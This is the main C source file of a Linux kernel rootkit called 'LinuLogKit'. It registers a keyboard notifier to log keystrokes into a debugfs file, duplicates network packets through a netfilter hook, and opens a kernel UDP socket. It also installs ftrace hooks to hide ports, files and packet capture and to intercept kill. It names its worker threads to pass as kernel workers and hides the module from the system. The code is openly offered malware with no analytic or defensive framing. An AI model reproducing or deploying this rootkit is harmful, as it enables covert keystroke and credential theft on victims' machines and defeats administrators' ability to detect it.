#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/moduleparam.h>
#include <linux/keyboard.h>
#include <linux/debugfs.h>
#include <linux/input.h>
#include <linux/spinlock.h>
#include <linux/net.h>
#include <net/sock.h>
#include <linux/sched.h>
#include <linux/atomic.h>
//
#include "netfilter.h"
#include "keymap.h"
#include "ports.h"
#include "ftrace_helper.h"
#include "hide_libpcap.h"
#include "kill_hijack.h"
#include "hide_files.h"
#include "logger.h" 
#include "hide_files.h"
#include "port_hiding.h"

#define VER "1.0"

MODULE_AUTHOR("pemp");
MODULE_VERSION(VER);
MODULE_DESCRIPTION("LinuLogKit");
MODULE_LICENSE("GPL v2");

// declarations:
static int init_socket(void);
static void module_cleanup(void);
static int __init logger_init(void);
static void __exit logger_exit(void);
static void find_workers(char *keys_buf,char *packets_buf);

static ssize_t read(struct file *filp,
                    char *buffer,
                    size_t len,
                    loff_t *offset);
// variables:
static struct dentry *file;
static struct dentry *subdir;
const struct file_operations keys_fops = {
    .owner = THIS_MODULE,
    .read = read,
};

// socket
struct socket *sock;
struct sockaddr_in addr;

// definitions:
static ssize_t read(struct file *filp,
                    char *buffer,
                    size_t len,
                    loff_t *offset)
{
    return simple_read_from_buffer(buffer, len, offset, keys, write_index);
}
static void find_workers(char * keys_buf, char *packets_buf){
    char *key_worker = "kworker/R-pempK";
    char *packet_worker = "kworker/R-pempP";
    struct task_struct *task;
    for_each_process(task){
        if(strstr(task->comm, key_worker)){
            sprintf(keys_buf, "%d", task->pid);
        }
        if(strstr(task->comm, packet_worker)){
            sprintf(packets_buf, "%d", task->pid);
        }
    }

}
static int init_socket(void)
{
    int err;

    addr.sin_family = AF_INET;
    addr.sin_port = htons(UDP_SOURCE); // Local port for binding
    addr.sin_addr.s_addr = //htonl(INADDR_LOOPBACK);

    err = sock_create_kern(&init_net, PF_INET, SOCK_DGRAM, IPPROTO_UDP, &sock);
    if (err < 0)
    {
        pr_err("Failed to create socket\n");
        return -ENOMEM;
    }

    err = sock->ops->bind(sock, (struct sockaddr *)&addr, sizeof(addr));
    if (err < 0)
    {
        pr_err("Failed to bind socket\n");
        sock_release(sock);
        return -ENOMEM;
    }

    pr_info("Socket created and bound successfully\n");
    return 0;
}
static void module_cleanup(void)
{
    if (packet_wq)
    {
        flush_workqueue(packet_wq);
        destroy_workqueue(packet_wq);
        pr_info("Packet workqueue destroyed");
    }

    if (logger_wq)
    {
        flush_workqueue(logger_wq);
        destroy_workqueue(logger_wq);
        pr_info("Logger workqueue destroyed");
    }

    if (subdir)
    {
        debugfs_remove_recursive(subdir);
        pr_info("Debugfs removed");
    }

    if (sock)
    {
        sock_release(sock);
        pr_info("Socket released");
    }

    nf_unregister_net_hook(&init_net, &duplicate_packet_ops);
    pr_info("Net hook unregistered");

    unregister_keyboard_notifier(&logger_blk);
    pr_info("Keyboard notifier unregistered");

    fh_remove_hooks(port_hooks, 1);
    fh_remove_hooks(libpcap_hooks, 3);
    fh_remove_hooks(kill_hooks,1);
    fh_remove_hooks(hide_files_hooks, 1);
    pr_info("Hooks removed");

    pr_info("Logger successfully unloaded");
}
static int __init logger_init(void)
{
    int err;

    subdir = debugfs_create_dir("logger", NULL);
    if (IS_ERR(subdir))
    {
        pr_err("Failed to create debugfs directory");
        return PTR_ERR(subdir);
    }

    file = debugfs_create_file("keys", 0400, subdir, NULL, &keys_fops);
    if (!file)
    {
        pr_err("Failed to create debugfs file");
        err = -ENOENT;
        goto cleanup_debugfs;
    }

    logger_wq = create_singlethread_workqueue("pempK");
    if (!logger_wq)
    {
        pr_err("Failed to create logger workqueue");
        err = -ENOMEM;
        goto cleanup_debugfs;
    }

    packet_wq = create_singlethread_workqueue("pempP");
    if (!packet_wq)
    {
        pr_err("Failed to create packet workqueue");
        err = -ENOMEM;
        goto cleanup_logger_wq;
    }
    find_workers(keys_kthread_pid,packets_kthread_pid);

    err = init_socket();
    if (err < 0)
    {
        pr_err("Failed to initialize socket");
        goto cleanup_packet_wq;
    }

    err = register_keyboard_notifier(&logger_blk);
    if (err < 0)
    {
        pr_err("Failed to register keyboard notifier");
        goto cleanup_socket;
    }

    err = nf_register_net_hook(&init_net, &duplicate_packet_ops);
    if (err < 0)
    {
        pr_err("Failed to register net hook");
        goto cleanup_keyboard_notifier;
    }

    err = fh_install_hooks(port_hooks, 1);
    if (err < 0)
    {
        pr_err("Failed to install port hooks");
        goto cleanup_net_hook;
    }

    err = fh_install_hooks(libpcap_hooks, 3);
    if (err < 0)
    {
        pr_err("Failed to install libpcap hooks");
        goto cleanup_port_hooks;
    }
    err = fh_install_hooks(kill_hooks,1);
    if(err < 0){
        pr_err("Failed to install kill hooks");
        goto cleanup_libpcap_hooks;
    }
    err = fh_install_hooks(hide_files_hooks, 1);
    if (err < 0){
        pr_err("Failed to install hide files hooks");
        goto cleanup_kill_hooks;
    }
    pr_info("Logger successfully initialized");
    // hide module:
    hide_module();
    return 0;


cleanup_kill_hooks:
    fh_remove_hooks(kill_hooks, 1);
cleanup_libpcap_hooks:
    fh_remove_hooks(libpcap_hooks, 3);
cleanup_port_hooks:
    fh_remove_hooks(port_hooks, 1);
cleanup_net_hook:
    nf_unregister_net_hook(&init_net, &duplicate_packet_ops);
cleanup_keyboard_notifier:
    unregister_keyboard_notifier(&logger_blk);
cleanup_socket:
    sock_release(sock);
cleanup_packet_wq:
    flush_workqueue(packet_wq);
    destroy_workqueue(packet_wq);
cleanup_logger_wq:
    flush_workqueue(logger_wq);
    destroy_workqueue(logger_wq);
cleanup_debugfs:
    debugfs_remove_recursive(subdir);

    return err;
}

static void __exit logger_exit(void)
{

    module_cleanup();
}

module_init(logger_init);
module_exit(logger_exit);